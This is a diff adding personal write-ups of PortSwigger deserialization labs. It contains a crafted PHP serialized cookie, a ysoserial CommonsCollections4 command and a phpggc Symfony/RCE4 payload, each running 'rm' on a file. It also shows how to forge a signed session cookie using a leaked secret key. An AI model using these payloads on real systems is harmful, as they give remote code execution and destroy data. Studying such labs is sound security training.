@@ -98,4 +98,56 @@ hint given and access `libs/CustomTemplate.php~` to retrieve the source code.
 3. After base-64 and URL encoding (in that order) the object and setting it as the session cookie, we can make
 the GET request to solve the lab:   `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D`
 
+## Exploiting Java deserialization with Apache Commons
 
+[Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
+
+Write-up:
+
+1. We need to use `ysoserial` to solve this lab. After looking at the documentation,
+I was able to use the following command to craft an exploit payload:
+
+    ```
+    java -jar ysoserial-all.jar \
+    --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+    --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+    --add-opens=java.base/java.net=ALL-UNNAMED \
+    --add-opens=java.base/java.util=ALL-UNNAMED \
+    CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+    ```
+
+    This generates a base64 payload.
+
+2. We can use URL-encode the payload, set it as session cookie, and send a request
+to solve the lab.
+
+## Exploiting PHP deserialization with a pre-built gadget chain
+
+[Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
+
+Write-up:
+
+1. We need to find out which framework the application is using. Analyzing the page's
+source code shows us a reference to `/cgi-bin/phpinfo.php`. Also, sending a request with 
+an invalid cookie shows us an error message that discloses that the web application
+is using Symfony Version: 4.3.6.
+
+2. We can use `PGPGGC` to get an exploit: `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0`
+URL-encoding the exploit, setting it as session cookie and sending a request returns an
+error: `PHP Fatal error: Uncaught Exception: Signature does not match session`.
+
+3. After further research, I found out the session cookie was a bit more complex.
+URL-decoding it reveals:
+
+    ```json
+    {
+        "token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJsdHNiczVmMTU5dmw3ZmZya29jeDlvNGFidnk1bnBiayI7fQ==",
+        "sig_hmac_sha1":"39aa1851b62e717d8daf90e88376fa455f1c21dc"
+    }
+    ```
+
+    It has a token, which corresponds to the object, and a signature, which is a hash
+    that involves the object and the SECRET-KEY in `/cgi-bin/phpinfo.php`. We can
+    craft a script to get us a valid cookie: `php-cookie.php`
+
+4. Setting the script's output as the session cookie solves the lab. 
